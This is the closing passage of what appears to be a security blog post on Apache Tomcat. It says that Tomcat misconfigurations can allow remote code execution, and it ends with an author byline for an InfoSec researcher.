<p><span style="color: #000000"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjkNXqHKEyeP-DSskDX-SF4UpRbJuecs9I9y3ABC0_BeGSOXGEyOsZ1EXws-2efQtiH1bAPOrrkXoJIiJszsLqC7sEj3s2nQtUDLv2UwxHoKnD-TFmZYKg5dnkemW1J1zbgp-xFvHczyjgbZ1-AgA2_BlaQgmL0daC4YZ1UGTwuMu6LcUaEA_3zboOaLymO/s16000/66.png"/></span></p>
<h3><span style="color: #800000">Conclusion</span></h3>
<p><span style="color: #000000">In essence, <strong data-start="1924" data-end="1941">Apache Tomcat</strong> remains a preferred choice for deploying <strong data-start="1983" data-end="2008">Java web applications</strong>, offering a blend of <strong data-start="2030" data-end="2045">versatility</strong> and <strong data-start="2050" data-end="2062">security</strong> that caters to the diverse needs of developers and administrators alike. Nevertheless, due to <strong data-start="2157" data-end="2178">misconfigurations</strong>, attackers can abuse it to perform unintended actions such as <strong data-start="2241" data-end="2266">Remote Code Execution</strong>.</span></p>
<p><span style="color: #000000"><strong>Author:Â </strong>Vinayak Chauhan is an InfoSec researcher and Security Consultant. Contact</span>Â <strong><a href="https://www.linkedin.com/in/vinayak--chauhan/">here</a></strong></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
